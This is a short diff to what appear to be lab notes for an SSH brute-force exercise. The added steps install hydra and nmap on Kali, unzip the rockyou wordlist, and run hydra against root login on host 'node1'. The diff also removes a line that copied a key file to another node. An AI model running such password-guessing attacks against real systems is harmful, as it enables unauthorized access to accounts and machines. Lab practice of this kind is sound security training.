@@ -1,6 +1,11 @@
+1. Make sure kali machine has necessary items
+apt update && apt install -y hydra nmap wordlists
+
+2. Unzip word list
 gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+3. Launch attack
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://node1
 
+4. Test locally on node if necessary
 test ssh root@localhost
-
-transfer keys accross - scp keys/kSk.key root@node2:/logChain/app/keys/
